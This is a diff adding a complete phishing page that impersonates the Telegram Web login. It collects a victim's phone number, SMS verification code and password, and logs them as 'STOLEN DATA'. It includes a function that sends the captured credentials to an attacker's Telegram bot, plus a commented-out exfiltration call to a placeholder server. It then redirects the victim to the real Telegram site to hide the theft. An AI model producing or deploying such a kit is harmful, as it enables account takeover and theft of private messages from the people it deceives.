@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Telegram Web - Secure Messenger</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: linear-gradient(135deg, #0088cc, #00a2ff);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .logo {
+            font-size: 48px;
+            margin-bottom: 20px;
+            color: #0088cc;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+        input:focus {
+            border-color: #0088cc;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #0088cc;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background: #0077b3;
+        }
+        .step {
+            display: none;
+        }
+        .active {
+            display: block;
+        }
+        .loading {
+            display: none;
+            color: #0088cc;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">📱</div>
+        <h1>Telegram Web</h1>
+        <p class="subtitle">Please enter your phone number to continue</p>
+        
+        <!-- Step 1: Phone Number -->
+        <div class="step active" id="step1">
+            <input type="tel" id="phone" placeholder="+998 90 123 45 67" required>
+            <button onclick="sendCode()">Next</button>
+        </div>
+        
+        <!-- Step 2: SMS Code -->
+        <div class="step" id="step2">
+            <p>We sent a code to your phone</p>
+            <input type="text" id="code" placeholder="12345" required>
+            <button onclick="verifyCode()">Verify</button>
+        </div>
+        
+        <!-- Step 3: Password -->
+        <div class="step" id="step3">
+            <p>Enter your password</p>
+            <input type="password" id="password" placeholder="Password" required>
+            <button onclick="login()">Sign In</button>
+        </div>
+        
+        <div class="loading" id="loading">Signing in...</div>
+    </div>
+
+    <script>
+    // Ma'lumotlarni saqlash
+    let userData = {};
+    
+    function sendCode() {
+        userData.phone = document.getElementById('phone').value;
+        
+        if(!userData.phone) {
+            alert('Please enter your phone number');
+            return;
+        }
+        
+        // Ma'lumotlarni yuborish
+        logData('phone', userData.phone);
+        
+        // Keyingi qadam
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('step2').classList.add('active');
+    }
+    
+    function verifyCode() {
+        userData.code = document.getElementById('code').value;
+        
+        if(!userData.code) {
+            alert('Please enter the code');
+            return;
+        }
+        
+        // Kodni yuborish
+        logData('code', userData.code);
+        
+        // Keyingi qadam
+        document.getElementById('step2').classList.remove('active');
+        document.getElementById('step3').classList.add('active');
+    }
+    
+    function login() {
+        userData.password = document.getElementById('password').value;
+        
+        if(!userData.password) {
+            alert('Please enter your password');
+            return;
+        }
+        
+        // Parolni yuborish
+        logData('password', userData.password);
+        
+        // Loading ko'rsatish
+        document.getElementById('loading').style.display = 'block';
+        
+        // Barcha ma'lumotlarni yuborish
+        logData('full_data', JSON.stringify(userData));
+        
+        // Redirect qilish
+        setTimeout(function() {
+            window.location.href = 'https://web.telegram.org';
+        }, 3000);
+    }
+    
+    function logData(type, data) {
+        // GitHub Pages da backend yo'q, shuning uchun console da saqlaymiz
+        console.log(`🎣 STOLEN DATA - ${type}: ${data}`);
+        
+        // Agar server bo'lsa, bu yerga fetch qo'shishingiz mumkin
+        // fetch(`https://yourserver.com/log?type=${type}&data=${data}`);
+        
+        // Yoki Telegram botga yuborish
+        // sendToTelegram(type, data);
+    }
+    
+    function sendToTelegram(type, data) {
+        // Telegram bot orqali ma'lumotlarni olish
+        const botToken = 'YOUR_BOT_TOKEN';
+        const chatId = 'YOUR_CHAT_ID';
+        const message = `🎣 New Login Data:\nType: ${type}\nData: ${data}`;
+        
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        });
+    }
+    </script>
+</body>
+</html>
